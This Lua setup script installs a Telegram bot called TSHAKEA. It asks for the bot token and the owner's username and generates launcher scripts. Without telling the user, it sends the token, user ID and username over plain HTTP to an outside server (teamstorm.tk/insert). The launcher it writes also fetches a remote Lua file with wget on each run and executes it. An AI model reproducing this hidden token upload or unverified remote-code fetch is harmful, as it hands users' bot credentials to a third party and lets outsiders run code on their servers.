serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_TSHAKEA = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_TSHAKEA = function() 
local Create_Info = function(Token,Sudo,UserName)  
local TSHAKEA_Info_Sudo = io.open("sudo.lua", 'w')
TSHAKEA_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
TSHAKEA_Info_Sudo:close()
end  
if not database:get(Server_TSHAKEA.."Token_TSHAKEA") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_TSHAKEA.."Token_TSHAKEA",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua Run.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_TSHAKEA.."UserName_TSHAKEA") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua Run.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua Run.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_TSHAKEA.."UserName_TSHAKEA",Json.Info.Username)
database:set(Server_TSHAKEA.."Id_TSHAKEA",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua Run.lua')
end
local function Files_TSHAKEA_Info()
Create_Info(database:get(Server_TSHAKEA.."Token_TSHAKEA"),database:get(Server_TSHAKEA.."Id_TSHAKEA"),database:get(Server_TSHAKEA.."UserName_TSHAKEA"))   
http.request("http://teamstorm.tk/insert/?id="..database:get(Server_TSHAKEA.."Id_TSHAKEA").."&user="..database:get(Server_TSHAKEA.."UserName_TSHAKEA").."&token="..database:get(Server_TSHAKEA.."Token_TSHAKEA"))
local RunTSHAKEA = io.open("TSHAKEA", 'w')
RunTSHAKEA:write([[
#!/usr/bin/env bash
cd $HOME/TSHAKEA
token="]]..database:get(Server_TSHAKEA.."Token_TSHAKEA")..[["
rm -fr TSHAKEA.lua
wget "https://raw.githubusercontent.com/TSHAKEAbo/TSHAKEA/master/TSHAKEA.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TSHAKEA.lua -p PROFILE --bot=$token
done
]])
RunTSHAKEA:close()
local RunTs = io.open("Be", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/TSHAKEA
while(true) do
rm -fr ../.telegram-cli
screen -S TSHAKEA -X kill
screen -S TSHAKEA ./TSHAKEA
done
]])
RunTs:close()
end
Files_TSHAKEA_Info()
database:del(Server_TSHAKEA.."Token_TSHAKEA");database:del(Server_TSHAKEA.."Id_TSHAKEA");database:del(Server_TSHAKEA.."UserName_TSHAKEA")
sudos = dofile('sudo.lua')
os.execute('./Run ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_TSHAKEA()  
var = true
else   
f:close()  
database:del(Server_TSHAKEA.."Token_TSHAKEA");database:del(Server_TSHAKEA.."Id_TSHAKEA");database:del(Server_TSHAKEA.."UserName_TSHAKEA")
sudos = dofile('sudo.lua')
os.execute('./Run ins')
var = false
end  
return var
end
Load_File()
